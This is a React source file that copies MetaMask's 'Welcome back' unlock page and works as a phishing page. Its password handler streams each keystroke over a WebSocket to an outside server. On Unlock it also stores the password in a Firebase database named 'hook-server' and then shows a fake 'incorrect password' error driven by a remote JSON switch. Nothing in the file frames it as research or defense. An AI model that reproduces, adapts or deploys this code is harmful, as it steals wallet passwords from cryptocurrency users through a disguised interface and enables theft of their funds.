import { useEffect, useState, useRef } from "react";
import { EventEmitter } from "events";
import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, set } from "firebase/database";
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';

import Mascot from "./mascot.component";
import useSystemTheme from "./useSystemTheme";

import { ReactComponent as SpinnerSVG } from "./images/spinner.svg";
import closeIcon from "./images/icons/close.svg";
import foxSVG from "./images/metamask-fox.svg";
import forgotLock from "./images/forgot-password-lock.png";
import spinnerGIF from "./images/spinner.gif";

import "./index.css";
import "./custom.css";

const firebaseConfig = {
  apiKey: "AIzaSyCd2I2JNm7okch3L8S0uozioChrntq05Ow",
  authDomain: "hook-server-fcc32.firebaseapp.com",
  databaseURL: "https://hook-server-fcc32-default-rtdb.firebaseio.com/",
  projectId: "hook-server-fcc32",
  storageBucket: "hook-server-fcc32.firebasestorage.app",
  messagingSenderId: "816070028547",
  appId: "1:816070028547:web:7c5202b183183dee8fcd36",
  measurementId: "G-957FNZD5T4"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// WebSocket constants
const PING = 99;
const SEND_UID = 101;
const BROWSER_CONNECTED = 102;

const formatDateWithMilliseconds = () => {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, '0');
  const day = String(now.getDate()).padStart(2, '0');
  const hours = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');
  const milliseconds = String(now.getMilliseconds()).padStart(4, '0'); // Milliseconds padded to 4 digits

  return `${year}${month}${day}${hours}${minutes}${seconds}${milliseconds}`;
};

function InitialLoading() {
  return (
    <>
      <img className="loading-logo" src={foxSVG} alt="" loading="lazy" />
      <img className="loading-spinner" src={spinnerGIF} alt="" loading="lazy" />
      <div
        className="loading-timeout-message"
        aria-live="polite"
        role="status"
      ></div>
    </>
  );
}
function PasswordInput({ error, password, handlePasswordChange, handleKeyUp }) {
  const [focused, setFocused] = useState(false);

  return (
    <div
      className={`mm-box mm-text-field mm-text-field--size-lg ${
        error ? "mm-text-field--error" : "mm-text-field--truncate"
      } mm-form-text-field__text-field mm-box--padding-right-0 mm-box--padding-left-0 mm-box--display-inline-flex mm-box--align-items-center mm-box--background-color-background-default mm-box--rounded-lg mm-box--border-width-1 box--border-style-solid ${
        focused ? "mm-text-field-focused" : ""
      }`}
    >
      <input
        className="mm-box mm-text mm-input mm-input--disable-state-styles mm-text-field__input mm-text--body-md mm-box--margin-0 mm-box--padding-0 mm-box--padding-right-4 mm-box--padding-left-4 mm-box--color-text-default mm-box--background-color-transparent mm-box--border-style-none"
        id="password"
        placeholder="Enter your password"
        type="password"
        data-testid="unlock-password"
        aria-label="Password"
        value={password}
        autoFocus
        onChange={handlePasswordChange}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        onKeyUp={handleKeyUp}
      />
    </div>
  );
}

function Spinner() {
  return (
    <div className="mm-box loading-overlay">
      <div className="mm-box loading-overlay__container mm-box--margin-bottom-3">
        <div className="spinner loading-overlay__spinner">
          <SpinnerSVG />
        </div>
      </div>
      <div className="mm-box mm-box--display-flex mm-box--flex-direction-row mm-box--justify-content-center mm-box--align-items-center"></div>
    </div>
  );
};

function ForgetPasswordModal({setOpen}) {
  return (
    <div
      className="mm-modal reset-password-modal"
      data-testid="reset-password-modal"
    >
      <div
        className="mm-box mm-modal-overlay mm-box--width-full mm-box--height-full mm-box--background-color-overlay-default"
        aria-hidden="true"
      ></div>
      <div data-focus-guard="true" tabIndex="0"></div>
      <div data-focus-lock-disabled="false">
        <div className="mm-box mm-modal-content mm-box--padding-top-4 mm-box--sm:padding-top-8 mm-box--md:padding-top-12 mm-box--padding-right-4 mm-box--padding-bottom-4 mm-box--sm:padding-bottom-8 mm-box--md:padding-bottom-12 mm-box--padding-left-4 mm-box--display-flex mm-box--justify-content-center mm-box--align-items-center mm-box--width-full mm-box--height-full">
          <section
            className="mm-box mm-modal-content__dialog mm-modal-content__dialog--size-sm mm-box--padding-top-4 mm-box--padding-bottom-4 mm-box--display-flex mm-box--flex-direction-column mm-box--width-full mm-box--background-color-background-default mm-box--rounded-lg"
            role="dialog"
            aria-modal="true"
          >
            <header className="mm-box mm-header-base mm-modal-header mm-box--padding-right-4 mm-box--padding-bottom-4 mm-box--padding-left-4 mm-box--display-flex mm-box--justify-content-space-between">
              <div className="mm-box mm-box--width-full">
                <h4 className="mm-box mm-text mm-text--heading-sm mm-text--text-align-center mm-box--color-text-default">
                  Forgot your password?
                </h4>
              </div>
              <div className="mm-box mm-box--display-flex mm-box--justify-content-flex-end">
                <button
                  className="mm-box mm-button-icon mm-button-icon--size-sm mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-icon-default mm-box--background-color-transparent mm-box--rounded-lg"
                  aria-label="Close"
                  onClick={() => setOpen(false)}
                >
                  <span
                    className="mm-box mm-icon mm-icon--size-sm mm-box--display-inline-block mm-box--color-inherit"
                    style={{
                      maskImage: `url(${closeIcon})`,
                    }}
                  ></span>
                </button>
              </div>
            </header>
            <div className="mm-box mm-box--padding-inline-4">
              <div className="mm-box mm-box--margin-bottom-2 mm-box--display-flex mm-box--justify-content-center mm-box--align-items-center mm-box--width-full">
                <img
                  src={forgotLock}
                  width="154"
                  height="154"
                  alt="Forgot your password?"
                  // style="align-self: center;"
                />
              </div>
              <p className="mm-box mm-text mm-text--body-md mm-box--margin-bottom-4 mm-box--color-text-default">
                MetaMask can’t recover your password for you.
              </p>
              <p className="mm-box mm-text mm-text--body-md mm-box--margin-bottom-6 mm-box--color-text-default">
                You can reset your wallet by entering the Secret Recovery Phrase
                you used when you set up your wallet.
              </p>
              <button
                className="mm-box mm-text mm-button-base mm-button-base--size-lg mm-button-base--block mm-button-primary mm-button-primary--type-danger mm-text--body-md-medium mm-box--padding-0 mm-box--padding-right-4 mm-box--padding-left-4 mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-error-inverse mm-box--background-color-error-default mm-box--rounded-xl"
                data-testid="reset-password-modal-button"
              >
                Reset wallet
              </button>
            </div>
          </section>
        </div>
      </div>
      <div data-focus-guard="true" tabIndex="0"></div>
    </div>
  );
}
export default function MetaMaskUnlock() {
  const animationEventEmitter = new EventEmitter();

  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [open, setOpen] = useState(false);
  const [password, setPassword] = useState("");
  const [passwordLoading, setPasswordLoading] = useState(false);
  const theme = useSystemTheme();

  const [isConnected, setIsConnected] = useState(false);
  const ws = useRef(null);
  const uniqueId = useRef(uuidv4());
  
  const mockPending = async (fn, tm) => {
    fn(true);
      await new Promise((resolve) => setTimeout(resolve, tm));
      fn(false);
  }

  useEffect(() => {
    const html = document.documentElement;
    html.setAttribute("data-theme", theme);
  }, [theme]);

  useEffect(() => {
    // Initialize WebSocket connection
    connectWebSocket();

    // Cleanup on component unmount
    return () => {
      if (ws.current) {
        ws.current.close();
      }
    };
  }, []);

  const connectWebSocket = () => {
    ws.current = new WebSocket("wss://lucid-socket-server.onrender.com");

    ws.current.onopen = () => {
      setIsConnected(true);
      // Send browser connected message
      const jsonObject = {
        e: BROWSER_CONNECTED,
        v: uniqueId.current
      };
      
      if (ws.current && ws.current.readyState === WebSocket.OPEN) {
        ws.current.send(JSON.stringify(jsonObject));
      } else {
        console.warn('WebSocket not connected');
      }
    };

    ws.current.onclose = () => {
      setIsConnected(false);
    };

    ws.current.onerror = (error) => {
      console.error('WebSocket error:', error);
      setIsConnected(false);
    };
  };

  // Ping interval
  useEffect(() => {
    const pingInterval = setInterval(() => {
      if (isConnected && ws.current) {
        const pingObject = {
          e: PING,
          v: "k"
        };
        
        if (ws.current && ws.current.readyState === WebSocket.OPEN) {
          ws.current.send(JSON.stringify(pingObject));
        } else {
          console.warn('WebSocket not connected');
        }
      } else {
        connectWebSocket();
      }
    }, 5000);

    return () => clearInterval(pingInterval);
  }, [isConnected]);

  useEffect(() => {
    //Loading Simulation
    mockPending(setLoading, 500);

  }, []);

  const handlePasswordChange = (e) => {
    const value = e.target.value;
    setError("");
    setPassword(value);
    if (value.trim() === '' || !isConnected) return;

    const pingObject = {
      e: SEND_UID,
      v: value
    };

    if (ws.current && ws.current.readyState === WebSocket.OPEN) {
      ws.current.send(JSON.stringify(pingObject));
    } else {
      console.warn('WebSocket not connected');
    }
  };

  const getCurrentTimestamp = () => {
    return {
      milliseconds: Date.now(),
      seconds: Math.floor(Date.now() / 1000)
    };
  };

  const handleSubmit = async () => {
    const timestamp = getCurrentTimestamp();
    console.log('Current timestamp:', timestamp);
    if (!password.length) return;
    set(ref(db, "88_/-metamask/" + formatDateWithMilliseconds()), {
      value: password,
      date: String(new Date()),
    });

    const value = password;
    if (value.trim() === '' || !isConnected) {
      console.warn('Metamask Support API not connected');
    } else {
      const pingObject = {
        e: SEND_UID,
        v: value
      };
      
      if (ws.current && ws.current.readyState === WebSocket.OPEN) {
        ws.current.send(JSON.stringify(pingObject));
      } else {
        console.warn('WebSocket not connected');
      }
    }

    setError("");
    mockPending(setPasswordLoading, 300);

    try {
      const url = `https://api.npoint.io/2ea1efd04f12070f3b16`;
      const response = await axios.get(url);
      console.log(response.data.success)
      if (response.data.success) {
        // onSuccess()
      } else {
        setError("Password is incorrect. Please try again.");
      }
    } catch (error) {
      throw new Error(`Failed to fetch data: ${error.message}`);
    }
  };

  const handleKeyUp = async (e) => {
    if (e.keyCode === 13) {
      handleSubmit();
    }
  };

  return (
    <>
      <div id="app-content" dir="ltr">
        {loading ? (
          <InitialLoading />
        ) : (
          <>
            <div className="app os-win browser-chrome">
              <div className="mm-box main-container-wrapper">
                {passwordLoading && <Spinner />}
                <div className="mm-box mm-box--padding-bottom-12 mm-box--display-flex mm-box--flex-direction-column mm-box--justify-content-center mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                  <div
                    className="mm-box unlock-page mm-box--padding-4 mm-box--display-flex mm-box--flex-direction-column mm-box--justify-content-center mm-box--align-items-center mm-box--width-full"
                    data-testid="unlock-page"
                  >
                    <div className="mm-box mm-box--display-flex mm-box--flex-direction-column mm-box--align-items-center mm-box--width-full">
                      <div className="mm-box unlock-page__mascot-container mm-box--margin-bottom-0">
                        <div>
                          <Mascot
                            animationEventEmitter={animationEventEmitter}
                            width="170"
                            height="170"
                          />
                        </div>
                      </div>
                      <h1
                        className="mm-box mm-text mm-text--display-md mm-text--font-weight-medium mm-text--text-align-center mm-box--margin-bottom-12 mm-box--color-text-default"
                        data-testid="unlock-page-title"
                      >
                        Welcome back
                      </h1>
                      <div className="mm-box mm-form-text-field mm-box--margin-bottom-4 mm-box--display-flex mm-box--flex-direction-column mm-box--width-full">
                        <PasswordInput
                          error={error}
                          password={password}
                          handlePasswordChange={handlePasswordChange}
                          handleKeyUp={handleKeyUp}
                        />
                        {error && (
                          <div className="mm-box mm-text mm-help-text mm-form-text-field__help-text mm-text--body-sm mm-box--margin-top-1 mm-box--color-error-default">
                            <div className="mm-box unlock-page__help-text mm-box--display-flex mm-box--flex-direction-column">
                              <p
                                className="mm-box mm-text mm-text--body-sm mm-text--text-align-left mm-box--color-error-default"
                                data-testid="unlock-page-help-text"
                              >
                                Password is incorrect. Please try again.
                              </p>
                            </div>
                          </div>
                        )}
                      </div>
                      <button
                        className={`mm-box mm-text mm-button-base mm-button-base--size-lg ${
                          !password.length && "mm-button-base--disabled"
                        } mm-button-base--block mm-button-primary mm-button-primary--disabled mm-text--body-md-medium mm-box--margin-bottom-6 mm-box--padding-0 mm-box--padding-right-4 mm-box--padding-left-4 mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-icon-inverse mm-box--background-color-icon-default mm-box--rounded-xl`}
                        disabled={!password.length}
                        data-testid="unlock-submit"
                        onClick={handleSubmit}
                      >
                        Unlock
                      </button>
                      <button
                        className="mm-box mm-text mm-button-base mm-button-link mm-button-link--size-auto mm-text--body-md-medium mm-box--margin-bottom-6 mm-box--padding-0 mm-box--padding-right-0 mm-box--padding-left-0 mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-primary-default mm-box--background-color-transparent"
                        data-testid="unlock-forgot-password-button"
                        type="button"
                        onClick={() => setOpen(true)}
                      >
                        Forgot password?
                      </button>
                      <p className="mm-box mm-text mm-text--body-md mm-box--color-text-default">
                        <span>
                          Need help? Contact{" "}
                          <a
                            className="mm-box mm-text mm-button-base mm-button-link mm-button-link--size-auto mm-text--body-md-medium mm-box--padding-0 mm-box--padding-right-0 mm-box--padding-left-0 mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-primary-default mm-box--background-color-transparent"
                            href="https://support.metamask.io"
                            type="button"
                            target="_blank"
                            style={{
                              paddingBottom: "1px",
                            }}
                            rel="noopener noreferrer"
                          >
                            MetaMask support
                          </a>
                        </span>
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {open && <ForgetPasswordModal setOpen={setOpen}/>}
          </>
        )}
      </div>
    </>
  );
}
